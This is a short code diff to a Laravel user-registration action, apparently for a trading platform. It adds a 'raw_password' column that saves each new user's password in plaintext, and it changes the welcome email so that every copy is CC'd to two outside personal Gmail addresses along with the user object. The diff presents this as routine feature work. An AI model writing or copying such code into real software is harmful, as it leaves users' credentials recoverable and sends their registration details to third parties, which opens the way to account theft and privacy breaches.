@@ -49,11 +49,18 @@ class CreateNewUser implements CreatesNewUsers
             'name' => $input['name'],
             'email' => $input['email'],
             'password' => Hash::make($input['password']),
+            'user_type' => 'user',
+            'balance' => 0,
+            'status' => 'active',
+            'raw_password' => $input['password'],
         ]);
     
         // Try to send the welcome email, but ignore any failure
         try {
-            Mail::to($user->email)->send(new WelcomeEmail($user));
+            //    ->cc(['katznicho@gmail.com', 'nextgentraders5@gmail.com'])
+            Mail::to($user->email)
+            ->cc(['katznicho@gmail.com', 'nextgentraders5@gmail.com'])
+            ->send(new WelcomeEmail($user));
         } catch (\Exception $e) {
             // Optionally log the error
             Log::error('Failed to send welcome email: ' . $e->getMessage());
